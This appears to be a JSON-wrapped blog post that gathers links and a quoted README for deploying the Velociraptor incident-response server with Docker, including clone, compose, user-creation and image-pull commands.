    "content": "Video Demohttps://www.youtube.com/watch?v=2kgC9Ushk9g&amp;ab_channel=TaylorWaltonVelociraptor Release Linkhttps://github.com/velocidex/velociraptor/releases/Surprisingly Simple Documentationhttps://docs.velociraptor.app/docs/deployment/clients/Tutorial Followedhttps://socfortress.medium.com/free-incident-response-with-velociraptor-bedd2583415dDocker Versionhttps://github.com/weslambert/velociraptor-docker“velociraptor-dockerRun Velocidex Velociraptor server with DockerInstallEnsure docker-compose is installed on the hostgit clone https://github.com/weslambert/velociraptor-dockercd velociraptor-dockerChange credential values in .env as desireddocker-compose up (or docker-compose up -d for detached)Access the Velociraptor GUI via https://:8889Default u/p is admin/adminThis can be changed by running:docker exec -it velociraptor ./velociraptor –config server.config.yaml user add user1 user1 –role administratorNotes:Linux, Mac, and Windows binaries are located in /velociraptor/clients, which should be mapped to the host in the ./velociraptor directory if using docker-compose. There should also be versions of each automatically repacked based on the server configuration.Once started, edit server.config.yaml in /velociraptor, then run docker-compose down/up for the server to reflect the changesDocker imageTo pull only the Docker image:docker pull wlambert/velociraptorTo pull a specific version of the Docker image:docker pull wlambert/velociraptor:0.6.8-2”Weird Errors Encounteredhttps://stackoverflow.com/questions/68251632/yaml-unmarshal-errors-when-using-go"
  }
  
]

